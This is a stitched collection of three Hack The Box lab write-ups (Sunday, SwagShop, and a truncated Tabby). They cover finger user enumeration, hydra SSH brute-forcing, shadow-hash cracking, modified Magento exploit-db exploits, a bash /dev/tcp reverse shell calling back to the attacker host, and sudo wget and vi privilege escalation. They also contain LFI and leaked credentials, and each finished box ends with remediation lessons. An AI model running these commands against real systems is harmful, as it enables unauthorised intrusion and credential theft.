# Sunday Writeup w/o Metasploit

![](https://miro.medium.com/max/578/1*5y8ktvN6Xf0lIABNdgs09Q.png)

## Reconnaissance <a id="e576"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.76
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that 2 ports are open:

* **Port 79:** running Sun Solaris fingerd
* **Port 111:** running rpcbind

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 12:09 EST
Nmap scan report for 10.10.10.76
Host is up (0.042s latency).
Not shown: 996 closed ports
PORT      STATE    SERVICE   VERSION
79/tcp    open     finger    Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open     rpcbind   2-4 (RPC #100000)
10082/tcp filtered amandaidx
54328/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
....Network Distance: 2 hops
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunosOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.04 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports. Since the full nmap scan takes too long to run, let’s first run a quick scan to figure out which ports are open.

```text
nmap -p- -oA full-noscripts 10.10.10.76  --max-retries 0
```

* **— max-retries:** number of port scan probe retransmissions

We get back the following result showing that two other ports are open.

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 17:49 EST
Warning: 10.10.10.76 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.76
Host is up (0.039s latency).
Not shown: 63933 filtered ports, 1598 closed ports
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
22022/tcp open  unknown
55029/tcp open  unknown
```

Then we run a more comprehensive scan to identify services running on the above ports.

```text
nmap -p 79,111,22022,55029 -sV -oA full-scripts 10.10.10.7
```

We get back the following result showing that:

* **Port 22022:** is running SunSSH 1.3
* **Port 55029:** is running a service that nmap was not able to identify

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 17:52 EST
Nmap scan report for 10.10.10.76
Host is up (0.037s latency).PORT      STATE SERVICE VERSION
79/tcp    open  finger  Sun Solaris fingerd
|_finger: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
55029/tcp open  unknown
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunosService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.37 seconds
```

Since the UDP scan took too long to run, we don’t have UDP scan results for this blog.

## Enumeration <a id="603d"></a>

We’ll start off with enumerating port 79. A quick google search on the “Finger service” tells us that the finger protocol is used to find out information about users on a remote system. Therefore, we can use it to enumerate usernames.

First, check if there are any logged in users.

```text
root@kali:~# finger @10.10.10.76
No one logged on
```

No one is currently logged in. Let’s check if the user “root” exists.

```text
root@kali:~# finger root@10.10.10.76                                                                                                                                           
Login       Name               TTY         Idle    When    Where                                                                                                               
root     Super-User            pts/3        <Apr 24, 2018> sunday
```

It does exist. Now, let’s enumerate more usernames. The [seclists](https://installlion.com/kali/kali/main/s/seclists/install/index.html) project has a list of usernames that we can use in order to guess the usernames that are available on the server.

```text
/usr/share/seclists/Usernames/Names/names.txt
```

Pentestmonkey has a [finger-user-enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum) script that is used to enumerate OS-level user accounts via the finger service. Let’s run that on our host.

```text
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
```

* **-U:** file of usernames to check via finger service
* **-t:** server host running finger service

We get the following result showing us that “sammy” and “sunday” are users of the system.

```text
....
sammy@10.10.10.76: sammy                 pts/2        <Apr 24, 2018> 10.10.14.4          ..                                                                                    
sunny@10.10.10.76: sunny                              <Jan  5 23:37> 10.10.14.12         ..
....
```

## Initial Foothold <a id="4d32"></a>

Since SSH is open and we have two valid usernames, let’s try brute-forcing the users’ credentials using hydra. We’ll start off with Sunny.

```text
hydra -l sunny -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 ssh -s 22022
```

* **-l:** username
* **-P:** password file
* **-s:** port

We get back the following result showing us that Sunny’s password is “sunday”.

```text
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
....
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
....
```

SSH into Sunny’s account.

```text
ssh -p 22022 sunny@10.10.10.76
```

We get the following error.

```text
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```

The error tells us that the client and server were unable to agree on the key exchange algorithm. The server offered three legacy algorithms for key exchange. So we’ll have to choose one of these algorithms in order to login.

```text
ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76
```

* **-oKexAlgorithms:** enable a key exchange algorithm that is disabled by default

We’re in! Locate the user.txt flag and try to view it.

```text
sunny@sunday:~$ find / -name  user.txt 2>/dev/null
/export/home/sammy/Desktop/user.txtsunny@sunday:~$ cat /export/home/sammy/Desktop/user.txt 
cat: /export/home/sammy/Desktop/user.txt: Permission denied
```

We need to escalate our privileges to Sammy.

## Privilege Escalation <a id="252c"></a>

Run the following command to view the list of allowed commands that the user can run with root privileges.

```text
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
```

We can run the /root/troll command as root. This is obviously a custom command so let’s run it to see what it’s doing \(we don’t have read access to it\).

```text
sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)
```

It seems to be a script that prints the id of the user running it. Since we ran it with the ‘sudo’ command, it prints the id of root. We don’t have write access to the script, so we can’t escalate our privileges using it.

After a bit of digging, I found a backup file in the following directory.

```text
/backup
```

It contains two files agen22.backup and shadow.backup. The former we don’t have access to, however, we can view the latter.

```text
sammy@sunday:/backup$ cat shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

It’s a backup of the shadow file. We already know Sunny’s password so we’re not going to attempt to crack it. Instead, copy Sammy’s password and save it in the file sammy-hash.txt. Then use John to crack the hash.

```text
root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt sammy-hash.txt Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (?)
1g 0:00:01:17 DONE (2020-01-05 21:03) 0.01292g/s 2648p/s 2648c/s 2648C/s domonique1..bluenote
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We got a password! Let’s su into Sammy’s account.

```text
su - sammy
```

Now we can view the user.txt flag.

![](https://miro.medium.com/max/741/1*sNjl25x8PcsO0dq8WhPS2Q.png)

Let’s try to escalate to root privileges. Run the sudo command again to view the list of allowed commands the user can run as root.

```text
sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

We can run wget with root privileges! If you’re familiar with the “-i” flag in wget, you’ll know that we can use it to output the content of files. Therefore, we can run the following command to get the root flag.

```text
sudo wget -i /root/root.txt
```

However, in this scenario we’re simply reading the content of the flag and not really escalating privileges. To get a root shell we need to chain the following two vulnerabilities:

1. The user Sunny can execute the /root/troll file with root privileges, and
2. The user Sammy can overwrite any root owned file using the wget command.

Therefore, we’ll use Sammy’s sudo privileges to overwrite the /root/troll file and include a shell in it. Then we’ll use Sunny’s sudo privileges to run the /root/troll file and convert our shell to a root shell.

Alright, let’s do this! In the attack machine, create a file called “troll” and add the following code to it.

```text
#!/usr/bin/bashbash
```

Then start up a simple Python server in the directory the file is in.

```text
python -m SimpleHTTPServer 5555
```

Go back the target machine running with the Sammy user privileges, and run the wget command to overwrite the /root/troll file.

```text
sudo wget -O /root/troll http://10.10.14.12:5555/troll
```

In another SSH session running with the Sunny user privileges, execute the troll file.

```text
sudo /root/troll
```

Since we added a bash shell in the troll file and the troll file is being executed with root privilege, we get a root shell!

![](https://miro.medium.com/max/708/1*uwgWwKXkC3A9TvuG3_UMiw.png)

**Note:** Something on the server seems to be resetting the /root/troll file every couple of seconds, therefore you only have small window of time between overwriting the troll file as Sammy and executing the troll file as Sunny.

## Lessons Learned <a id="838c"></a>

To gain an initial foothold on the box we exploited two vulnerabilities.

1. Username enumeration of the finger service. The finger protocol is used to get information about users on a remote system. In our case, we used it to enumerate usernames that we later used to SSH into the server. The remediation for this vulnerability would be to disable this service.
2. Weak authentication credentials. After getting a username from the finger service, we ran a brute force attack on SSH to obtain a user’s credentials. The user should have used a sufficiently long password that is not easily crackable.

To escalate privileges we exploited three vulnerabilities.

1. Information disclosure. As a non privileged user, we had access to a backup of the shadow file that leaked hashed passwords. Any file that contains sensitive information should not be available to non privileged users.
2. Weak authentication credentials. Although the passwords were hashed in the backup shadow file, we were able to obtain the plaintext passwords by running john on the hashes. Again, the users should have used sufficiently long passwords that are not easily crackable.
3. Security Misconfigurations. Both Sammy and Sunny were configured to run commands as root. Chaining these two commands together allowed us to escalate our privileges to root. The administrators should have conformed to the concept of least privilege when configuring these users’ accounts.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
swagshop-writeup-w-o-metasploit.md
# SwagShop Writeup w/o Metasploit

![](https://miro.medium.com/max/575/1*6lryATfzCzT-FjPG4gy0Xw.png)

## Reconnaissance <a id="7408"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.140
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that 2 ports are open:

* **Port 22:** running OpenSSH 7.2
* **Port 80:** running Apache httpd 2.4.29

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-06 10:42 EST
Nmap scan report for 10.10.10.140
Host is up (0.030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/6%OT=22%CT=1%CU=34092%PV=Y%DS=2%DC=I%G=Y%TM=5E13556E
....Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.68 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -p- -oA full 10.10.10.140
```

No other ports are open.

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -p- -oA udp 10.10.10.140
```

This scan took too long to run, so I don’t have UDP scan results for this blog.

Before we move on to enumeration, let’s make some mental notes about the nmap scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Ports 80 is running a web server, so we’ll perform our standard enumeration techniques on it.

## Enumeration <a id="aa73"></a>

I always start off with enumerating HTTP first. Visit the web application.

![](https://miro.medium.com/max/1363/1*YyeRjfqp_ixnCBqAIzoWkw.png)

It’s running Magento, which is an open-source e-commerce platform written in PHP. Considering that it is an off the shelf software, we’ll probably find reported vulnerabilities that are associated to it. But first, we need to get a version number. Notice that at the bottom of the page, it has a copyright detailing the year 2014, which is 6 years ago, so it’s very likely to be vulnerable.

Just like there is a scanner for WordPress applications \(WPScan\), there is one for Magento applications that is called [Mage Scan](https://github.com/steverobbins/magescan). Let’s use it to run a scan on the application.

```text
php magescan.phar -vvv scan:all 10.10.10.140 > output
```

* **-vvv:** increase the verbosity to level 3
* **scan:all:** run all scans

We get back the following result \(truncated\).

```text
Scanning http://10.10.10.140/...Magento Information+-----------+------------------+
| Parameter | Value            |
+-----------+------------------+
| Edition   | Community        |
| Version   | 1.9.0.0, 1.9.0.1 |
+-----------+------------------+Installed ModulesNo detectable modules were found.....Unreachable Path Check+-----------------------------------------+---------------+--------+
| Path                                    | Response Code | Status |
+-----------------------------------------+---------------+--------+
| app/etc/local.xml                       | 200           | Fail   |
| index.php/rss/order/NEW/new             | 200           | Fail   |
| shell/                                  | 200           | Fail   |
+-----------------------------------------+---------------+--------+
```

It reports the version number being 1.9.0.0 or 1.9.0.1 and they’re using the Community edition. There are no installed modules, so if we find any public vulnerabilities that are associated to modules, we can discard them. As for the unreachable path check, the last two paths don’t give us anything useful. However, the first path, gives us an xml file that leaks the _swagshop_ mysql database username and password.

```text
<host><![CDATA[localhost]]></host>
<username><![CDATA[root]]></username>
<password><![CDATA[fMVWh7bDHpgZkyfqQXreTjU9]]></password>
<dbname><![CDATA[swagshop]]></dbname>
```

This might come in handy later. Next, let’s run searchsploit.

```text
searchsploit magento
```

We get back the following result.

![](https://miro.medium.com/max/1354/1*KWOCERZxwyD517xPF62RQg.png)

The first three exploits don’t match our version, so we’ll ignore them. The next two might be useful. Since Mage Scan didn’t report plugins, we’ll ignore the plugin vulnerabilities. The two after that might be relevant to our version. Lastly, we’ll also ignore the eBay Magento exploits.

We narrowed down our exploits to four possible options: 39838,37811,19793 and 37977. We’ll start off with looking into exploit number 37977 because it doesn’t require authentication and it is an RCE vulnerability.

## Initial Foothold <a id="26dd"></a>

Copy the exploit to our current directory.

```text
searchsploit -m 37977
```

* **-m:** mirror an exploit to the current working directory.

After skimming through the code of the [exploit](https://www.exploit-db.com/exploits/37977), it seems to be chaining several SQL injection vulnerabilities together that eventually create an administrative account on the system with the username/password _forme_/_forme_.

To get the code working on our application, we need to make a few changes:

* Remove all the uncommented comments & explanation \(or you’ll get compilation errors\)
* Change the target variable to [http://10.10.10.140/](http://10.10.10.140/)
* Change the username/password to random/random \(optional\).

Run the exploit.

```text
root@kali:~/Desktop/htb/swagshop# python 37977.py 
DID NOT WORK
```

It didn’t work and it doesn’t give us much of an explanation why. So let’s redirect all the traffic from the script to Burp. To do that, perform the following steps.

* In Burp, visit _Proxy_ &gt; _Options_ &gt; _Proxy Listeners_ &gt; _Add_. In the _Binding_ tab, set the _Bind port_ to _8081_ and and in the _Request Handling_ tab, set the _Redirect to host_ option to _10.10.10.140_ and the **Redirect to Port** option to _80_. Make sure to select the newly added listener once you’re done.
* Go back to the script and change the target to [http://localhost:8081.](http://localhost:8081./)
* In Burp set intercept to be on.

This way all the traffic of the script will go through Burp first. Run the script again and send the request to _Repeater._ In _Repeater,_ execute the request.

![](https://miro.medium.com/max/1432/1*qBRzUVPhreDe72thXGLKOA.png)

As shown in the above image, the script is failing because it’s not finding the URL. Let’s try it in our browser.

```text
http://localhost:8081/admin
```

Doesn’t work. Let’s visit other links in the website and see how the URL changes. If we click on the Hack the Box sticker we get the following link.

```text
http://10.10.10.140/index.php/5-x-hack-the-box-sticker.html
```

It seems to be appending index.php to all the URLs. Let’s add that in our script. So now our target would be:

```text
http://localhost:8081/index.php
```

Run the script again.

```text
root@kali:~/Desktop/htb/swagshop# python 37977.py 
WORKED
Check http://localhost:8081/index.php/admin with creds random:random
```

It worked! Let’s visit the link and log in with our newly added credentials.

![](https://miro.medium.com/max/1413/1*q-OMgYCidMlGoK9L-jWPkg.png)

We’re in! From here we need to somehow get command execution. Recall that in our searchsploit results there was an authenticated RCE exploit. Transfer it to the current working directory.

```text
searchsploit -m 37811
```

After skimming through the code of the [exploit](https://www.exploit-db.com/exploits/37811), it seems to be a [PHP Object Injection](https://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/) in the administrator interface that leads to remote code execution.

To get the code working on our application, we need to make a few changes:

* Add the username/password random/random.
* Change the install date to the exact date from /app/etc/local.xml.

```text
username = 'forme'
password = 'forme'
php_function = 'system'
install_date = 'Wed, 08 May 2019 07:23:09 +0000'
```

As per the included instructions, run the script using the following command:

```text
# python3 %s <target> <payload>
python 37811.py  http://10.10.10.140/index.php "whoami"
```

We get a “mechanize.\_form\_controls.ControlNotFoundError”. We run it through Burp like we did previously and we find out that it’s not even logging in with the admin credentials we created.

After spending some time googling the error, I found [a post](https://stackoverflow.com/questions/35226169/clientform-ambiguityerror-more-than-one-control-matching-name) on stackoverflow stating that the issue is that “there is only one form from the code provided and multiple username, passwords fields which is where the Ambiguous error comes from”. Therefore, we need to use and index parameter for selecting the form. Make the following changes to the code.

```text
br.select_form(nr=0)#Comment out the following code
#br.form.new_control('text', 'login[username]', {'value': username})  
#br.form.fixup()
#br['login[username]'] = username
#br['login[password]'] = password#Add the following code
userone = br.find_control(name="login[username]", nr=0)
userone.value = username
pwone = br.find_control(name="login[password]", nr=0)
pwone.value = password
```

Let’s run it again. This time we get a different error.

```text
Traceback (most recent call last):
  File "37811.py", line 74, in <module>
    tunnel = tunnel.group(1)
AttributeError: 'NoneType' object has no attribute 'group'
```

Let’s try and figure out what the error means using Burp. The script already contains code that allows you to send a traffic through a proxy.

```text
#uncomment this line
br.set_proxies({"http": "localhost:8080"})
```

In the _HTTP history_ sub tab, we can see that the script is making 5 requests.

![](https://miro.medium.com/max/1399/1*XZuIrXMnpAlOmPGzr3c2xg.png)

The last request it makes before it reaches an error is the following.

![](https://miro.medium.com/max/1420/1*-OZRLXZ3AWML592_-WLooA.png)

Notice that the POST request is setting a period of 7 days \(7d in the URL\), however, that’s generating a response of “No Data Found”.

Now, if we go back to the error, it was generated in line 74.

```text
request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search("src=\"(.*)\?ga=", request.read())
tunnel = tunnel.group(1) . #line 74
```

The first line in the above code is the request that we saw in Burp. The second line seems to be doing some kind of regex, looking for the string “ga=” in the response. Then the third line \(line 74\) [does a match on the first parenthesised subgroup of the tunnel parameter](https://stackoverflow.com/questions/14909777/what-does-the-1-in-match-group1-mean). Since it’s finding nothing, we’re getting the ‘NoneType’ error.

Let’s visit that URL in the browser to see what’s going on. In Burp, right click on the request, select _Request in browser_ &gt; _In original session_.

![](https://miro.medium.com/max/1064/1*lgkHV4B2EtEwry7YZ6ayDQ.png)

Then click on the _Copy_ button and try the URL in the browser \(you have to have your browser configured to go through Burp\). We get the following page.

![](https://miro.medium.com/max/962/1*pbbVEt92nfnxx7SN4HZISg.png)

That’s the rendered version of the code we saw in the Response tab of Burp. I tried selecting the range in the drop down menu but that wasn’t sending any requests, so I started manipulating the value in the URL. I tried all the possible values \(24h, 7d, 1m,1y and 2y\), all of them gave me the same response with the exception of the 2y option, I get the following page.

![](https://miro.medium.com/max/693/1*2LRvGzCrMJr0ZQn0XgRJCA.png)

If you view the source code, you’ll find the following URL.

```text
...
<img src="http://10.10.10.140/index.php/admin/dashboard/tunnel/key/7ab75c459aa9aa75aaf35f957579c666/?ga=YTo5OntzOjM6ImNodCI7czoyOiJsYyI7czozOiJjaGYiO3M6Mzk6ImJnLHMsZjRmNGY0fGMsbGcsOTAsZmZmZmZmLDAuMSxlZGVkZWQsMCI7czozOiJjaG0iO3M6MTQ6IkIsZjRkNGIyLDAsMCwwIjtzOjQ6ImNoY28iO3M6NjoiZGI0ODE0IjtzOjM6ImNoZCI7czoyMjoiZTpBQUFBQUFxcUFBQUFBQUFBQUFBQSI7czo0OiJjaHh0IjtzOjM6IngseSI7czo0OiJjaHhsIjtzOjU4OiIwOnx8MDIvMjAxOXx8MDUvMjAxOXx8MDgvMjAxOXx8MTAvMjAxOXx8MTIvMjAxOXwxOnwwfDF8MnwzIjtzOjM6ImNocyI7czo3OiI1ODd4MzAwIjtzOjM6ImNoZyI7czozNToiMTEuMTExMTExMTExMTExLDMzLjMzMzMzMzMzMzMzMywxLDAiO30%253D&h=b47e205efe9e93bcf282877b9609b5b5" alt="chart" title="chart" />
...
```

The url includes the “ga=” regex string that the script was looking but couldn’t find! So if we change the period to “2y” in the script, we should get a working exploit!

```text
request = br.open(url + 'block/tab_orders/period/2y/?isAjax=true', data='isAjax=false&form_key=' + key)
```

Run the script again.

```text
root@kali:~/Desktop/htb/swagshop# python 37811.py  http://10.10.10.140/index.php/admin "whoami"www-data
```

We have command execution! Change the payload to include a reverse shell from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```text
python 37811.py http://10.10.10.140/index.php/admin "bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'"
```

Setup a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Run the script.

![](https://miro.medium.com/max/975/1*2wofzyWVAHdEuuJToW6TjA.png)

We have a shell! Let’s upgrade it to a better shell.

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground.

Grab the user.txt flag.

![](https://miro.medium.com/max/820/1*IoY8IqMKCCOP5vIjDrt30g.png)

## Privilege Escalation <a id="bd9a"></a>

To grab the root.txt flag, we need to escalate our privileges to root.

Run the following command to view the list of allowed commands the user can run as root without a password.

```text
www-data@swagshop:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

We’re allowed to run the vi command on any file in /var/www/html/ as root. If you’re not sure if you can escalate privileges with vi, you can simply check on this [website](https://gtfobins.github.io/). Since we’re restricted to a specific path, we’ll have to slightly modify the command.

```text
sudo vi /var/www/html/bla -c ':!/bin/sh'
```

The above command opens up a shell in the “bla” file and since we ran the command with sudo, the shell is running with root privileges!

```text
"/var/www/html/bla" [New File]
id/bin/sh
uid=0(root) gid=0(root) groups=0(root)
```

Grab the root.txt flag.

![](https://miro.medium.com/max/730/1*ieJsOAMG99J_aRv2X8DZ1w.png)

## Lessons Learned <a id="e2c2"></a>

To gain an initial foothold on the box we exploited four vulnerabilities.

1. Broken access control and sensitive information disclosure. The /app/etc/local.xml file is exposed to unauthenticated users. It not only leaked the mySQL password but also the install date which we required in order to get our exploit working. Proper access control should be applied on all sensitive directories and files.
2. Known SQL injection vulnerability that allowed an unauthenticated user to create an admin account. This is because a vulnerable version of the software was used. The administrators should have updated the application once a patch was made available.
3. Known PHP Object Injection that allowed an authenticated user to run arbitrary commands on the host of the application. Again, this was because a vulnerable version of the software was used. The administrators should have updated the application once a patch was made available
4. Security misconfiguration of the www-data user privileges. Why was the web daemon user \(www-data\) allowed to access the directories of a higher privileged user? The administrator should have conformed to the principle of least privilege and the concept of separation of privileges.

To escalate privileges we exploited one vulnerability.

1. Security misconfiguration of the vi binary. A non-root user was given the ability to run vi with root privileges. Since vi has the ability of running a shell, we were able to exploit that to run a shell with root privileges. Again, the administrator should have conformed to the principle of least privilege.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
tabby-writeup-w-o-metasploit.md
# Tabby Writeup w/o Metasploit

![Image for post](https://miro.medium.com/max/591/1*mh2clkXmiJxHT_y7hU2WxQ.png)

I presented this box at the [Hack The Box Ottawa August Meetup](https://www.meetup.com/Hack-The-Box-Meetup-Ottawa/events/272176003/). The presentation has been recorded and posted on [YouTube](https://www.youtube.com/watch?v=7QtJrMu5_YM).

Let’s get started!

## Reconnaissance <a id="41ed"></a>

Run [AutoRecon](https://github.com/Tib3rius/AutoRecon) to enumerate open ports and services running on those ports.

```text
sudo autorecon.py 10.10.10.194
```

View the full TCP port scan results.

```text
root@kali:~/# cat _full_tcp_nmap.txt
....
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat
| http-methods:                                                                                                                                                                
|_  Supported Methods: OPTIONS GET HEAD POST                                                                                                                                   
|_http-open-proxy: Proxy might be redirecting requests                                                                                                                         
|_http-title: Apache Tomcat
....
```

We have 3 ports open.

* **Port 22:** running OpenSSH 8.2p1
* **Port 80:** running Apache
* **Ports 8080:** running Apache Tomcat

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Port 8080 is running Apache Tomcat. We’ll have to check if we have access to the manager interface and test for default credentials. If we do get access to the application, we can simply deploy a war file that sends a reverse shell back to our attack machine.
* Port 80 is running a web server. AutoRecon by default runs gobuster and nikto scans on HTTP ports, so we’ll have to review them.

## Enumeration <a id="7f6f"></a>

We have two ports to enumerate: ports 80 & 8080.

**Port 8080: Apache Tomcat**

Visit the application in the browser.

![Image for post](https://miro.medium.com/max/1441/1*7jDJF1sWWqF3o5EgRCkT-A.png)

We can see that it is running Tomcat 9. Click on the _manager webapp_ link.

![Image for post](https://miro.medium.com/max/768/1*8qJfLLnajdjEclxIKblGUA.png)

We get prompted for credentials. At this stage we could test for default credentials. However, the Nikto scanner already does that and the default configuration of Autorecon runs a Nikto scan. Therefore, let’s view the nikto scan results.

```text
root@kali:~/# cat tcp_8080_http_nikto.txt 
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.194
+ Target Hostname:    10.10.10.194
+ Target Port:        8080
+ Start Time:         2020-07-30 11:29:27 (GMT-4)
--------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /: Appears to be a default Apache Tomcat install.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Operation now in progress
+ Scan terminated:  20 error(s) and 9 item(s) reported on remote host
+ End Time:           2020-07-30 11:42:40 (GMT-4) (793 seconds)
--------------------------------------------------------------------
+ 1 host(s) tested
```

It didn’t report any default credentials. Before we attempt a brute force attack, let’s move on to enumerating the other port.

**Port 8080: Apache**

Visit the application in the browser.

![Image for post](https://miro.medium.com/max/1430/1*3LQ8Xfp4cBQmPLE_q-GCSw.png)

View page source to see if we get any extra information.

![Image for post](https://miro.medium.com/max/1183/1*e0pV0vkak6nM7SdzSyNq7Q.png)

We find a link to the _news.php_ page. Notice that the link does not contain the IP address but instead the domain name. Therefore, we need to add it to the _/etc/hosts_ file first.

```text
10.10.10.194 megahosting.htb
```

Visit the page.

![Image for post](https://miro.medium.com/max/1440/1*-7Wg0VGHnUsGaM91_38taQ.png)

We can see in the URL that a file with the name “_statement”_ is being called and executed to present the above page. So the first thing we should test for is local file inclusion \(LFI\). An LFI vulnerability occurs when an application uses the path to a file as user input. If the application does not properly validate that input, an attacker can use this vulnerability to include files locally present on the server.

Add the following string in the _file_ parameter of the URL.

```text
../../../../../etc/passwd
```

We get the content of the _passwd_ file! So it is definitely vulnerable to a LFI.

![Image for post](https://miro.medium.com/max/1176/1*aeb0yFXqLzAWd8LHa15xpQ.png)

## Initial Foothold <a id="447b"></a>

Let’s switch to Burp for further testing.

![Image for post](https://miro.medium.com/max/1321/1*nXjYh46b1DeJw10J7-j9UQ.png)

